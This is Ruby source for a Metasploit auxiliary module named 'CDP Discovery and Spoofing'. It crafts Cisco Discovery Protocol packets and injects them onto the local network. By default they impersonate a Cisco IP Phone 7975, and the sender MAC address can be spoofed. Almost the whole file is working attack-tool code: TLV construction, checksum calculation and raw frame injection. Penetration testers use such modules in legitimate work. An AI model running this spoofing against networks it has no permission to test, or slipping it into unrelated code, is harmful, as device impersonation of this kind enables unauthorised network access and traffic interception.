##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Capture

  def initialize
    super(
      'Name'				=> 'CDP Discovery and Spoofing',
      'Description' => 'This module captures and sends Cisco Discovery Protocol (CDP) packets for discovery',
      'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
      'License'     =>  MSF_LICENSE,
      'Actions'			=> [
        ['Spoof', { 'Description' => 'Sends spoofed CDP packets' }]
      ],
      'DefaultAction' => 'Spoof'
    )
    register_options(
      [
        OptString.new('SMAC', [false, "MAC Address for MAC Spoofing"]),
        OptString.new('VTPDOMAIN', [false, "VTP Domain"]),
        OptString.new('DEVICE_ID', [true, "Device ID (e.g. SIP00070EEA3156)", "SEP00070EEA3156"]),
        OptString.new('PORT', [true, "The CDP 'sent through interface' value", "Port 1"]),
        # XXX: this is not currently implemented
        # OptString.new('CAPABILITIES',   [false, "Capabilities of the device (e.g. Router, Host, Switch)", "Router"]),
        OptString.new('PLATFORM', [true, "Platform of the device", "Cisco IP Phone 7975"]),
        OptString.new('SOFTWARE', [true, "Software of the device", "SCCP75.9-3-1SR2-1S"]),
        OptBool.new('FULL_DUPLEX', [true, 'True iff full-duplex, false otherwise', true])
      ], self.class)
    deregister_options('RHOST')
  end

  def setup
    check_pcaprub_loaded
    unless smac
      fail ArgumentError, "Unable to get SMAC from #{interface} -- Set INTERFACE or SMAC"
    end
    open_pcap
    close_pcap
  end

  def interface
    @interface ||= datastore['INTERFACE'] || Pcap.lookupdev
  end

  def smac
    @smac ||= datastore['SMAC'] || get_mac(interface)
  end

  def run
    begin
      open_pcap

      case action.name
      when 'Spoof'
        do_spoof
      else
        # this should never happen
        fail ArgumentError, "Invalid action #{action.name}"
      end
    ensure
      close_pcap
    end
  end

  def do_spoof
    print_status("Sending CDP message on #{interface}")
    p = prep_cdp                                              # Preparation of the CDP content

    # Injecting packet to the network
    l = PacketFu::Inject.new(iface: interface)
    cdp_length = ["%04X" % (p.length + 8).to_s].pack('H*')
    dot3 =  PacketFu::EthHeader.mac2str("01:00:0C:CC:CC:CC") + PacketFu::EthHeader.mac2str(smac) + cdp_length
    llc = "\xAA\xAA\x03\x00\x00\x0c\x20\x00"
    l.array_to_wire(array: [dot3 + llc + p])
  end

  def prep_cdp
    # device ID
    p = tlv(1, datastore['DEVICE_ID'])
    # port ID
    p << tlv(3, datastore['PORT'])
    # TODO: implement this correctly
    # capabilities = datastore['CAPABILITIES'] || "Host"
    # CAPABILITIES
    # define CDP_CAP_LEVEL1          0x40
    # define CDP_CAP_FORWARD_IGMP    0x20
    # define CDP_CAP_NETWORK_LAYER   0x10
    # define CDP_CAP_LEVEL2_SWITCH   0x08
    # define CDP_CAP_LEVEL2_SRB      0x04
    # define CDP_CAP_LEVEL2_TRBR     0x02
    # define CDP_CAP_LEVEL3_ROUTER   0x01
    p << tlv(4, "\x00\x00\x00\x41")
    # software version
    p << tlv(5, datastore['SOFTWARE'])
    # platform
    p << tlv(6, datastore['PLATFORM'])
    # VTP management domain
    p << tlv(9, datastore['VTPDOMAIN']) if datastore['VTPDOMAIN']
    # random 1000-7000 power consumption in mW
    p << tlv(0x10, [1000 + rand(6000)].pack('n'))
    # duplex
    p << tlv(0x0b, datastore['FULL_DUPLEX'] ? "\x01" : "\x00")
    # VLAn query.  TOD: figure out this field, use tlv, make configurable
    p << "\x00\x0F\x00\b \x02\x00\x01"

    # VDP version
    version = "\x02"
    # TTL (180s)
    ttl = "\xB4"
    checksum = cdpchecksum(version + ttl + "\x00\x00" + p)
    version + ttl + checksum + p
  end

  def tlv(t, v)
    [ t, v.length + 4 ].pack("nn") + v
  end

  def cdpchecksum(p)
    num_shorts = p.length / 2
    cs = 0
    c = p.length

    p.unpack("S#{num_shorts}").each do |x|
      cs += x
      c -= 2
    end

    cs += p[p.length - 1].getbyte(0) << 8 if c == 1
    cs = (cs >> 16) + (cs & 0xffff)
    cs = ~((cs >> 16) + cs) & 0xffff
    cs = ([cs].pack("S*")).unpack("n*")[0]

    [ "%02X" % cs ].pack('H*')
  end
end
